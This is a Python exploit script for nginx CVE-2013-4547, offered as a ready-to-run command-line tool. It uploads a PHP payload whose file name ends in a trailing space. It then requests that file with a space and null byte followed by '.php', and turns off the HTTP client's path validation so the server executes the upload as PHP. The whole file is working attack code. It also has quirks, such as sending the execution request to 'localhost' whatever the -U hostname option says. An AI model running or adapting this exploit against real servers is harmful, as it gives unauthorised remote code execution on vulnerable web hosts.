#!/usr/bin/env python
# -*- coding: utf-8 -*-
""" nginx-cve-2013-4547.py
    Example:
    python3 -m pip install docopt requests
    echo '<?php phpinfo(); ?>' > test.txt
    python3 nginx-cve-2013-4547.py -U localhost -f test.txt -x

    Note:
    This script has hardcoded values for form method,
    request protocol and uri. Feel free to customize!

    Usage:
        nginx-cve-2013-4547.py -h
        nginx-cve-2013-4547.py -f PAYLOAD_FILE -U Hostname
        nginx-cve-2013-4547.py -v
        
    Options:
        -h,--help                   : show this help message
        -v,--version                : Show version of script
        -f,--payload_file=<file>    : Payload file(PHP) to use in GET/POST request
        -U,--hostname=<hostname>    : Hostname 
        -x,--verbose                : Show more output
"""
import sys
import os


def do_request(payload_file, hostname, verbose=None):
    import requests
    import binascii
    import http.client
    import shutil

    if isinstance(payload_file, list):
        payload_file = ''.join(payload_file)
    if isinstance(hostname, list):
        hostname = ''.join(hostname)
    if isinstance(verbose, list):
        verbose = ''.join(verbose)

    payload_file_php = payload_file + "\x20"
    shutil.copy(payload_file, payload_file_php)
    url = "http://" + hostname + ":8080"
    print("Uploading to ", url)
    files = {'file_upload': open(payload_file_php, 'rb')}
    r = requests.post(url, files=files)
    if r.status_code == 200:
        if verbose:
            print(r.text)
        print("Payload uploaded! Will run the payload now!")
    else:
        print("Failed to upload the payload file!")
    retrieve_uri = "/uploadfiles/" + payload_file + "\x20\x00" + ".php"

    print("Trying to run payload at:", retrieve_uri)
    hostname = "localhost"

    class UnsafeHTTPConnection(http.client.HTTPConnection):
        def _validate_path(self, url):
            pass
    conn = UnsafeHTTPConnection(hostname, port=8080)
    r = conn.request('GET', retrieve_uri)
    print(conn.getresponse().read())

def main(docopt_args):
    if "--payload_file" in docopt_args:
        payload_file = docopt_args["--payload_file"]
    if "--hostname" in docopt_args:
        hostname = docopt_args["--hostname"]
    if "--verbose" in docopt_args:
        verbose = docopt_args["--verbose"]
    else:
        verbose = None
    do_request(payload_file, hostname, verbose)


if __name__ == "__main__":
    if sys.version_info.major < 3:
        print("[Warning] Not running inside python3. Launch the script with python3 %s" %
              os.path.basename(__file__))
        exit(-1)
    try:
        from docopt import docopt
    except ImportError:
        sys.exit("""You need docopt! Run python3 -m pip install docopt""")
    args = docopt(__doc__, version='1.0')
    main(args)
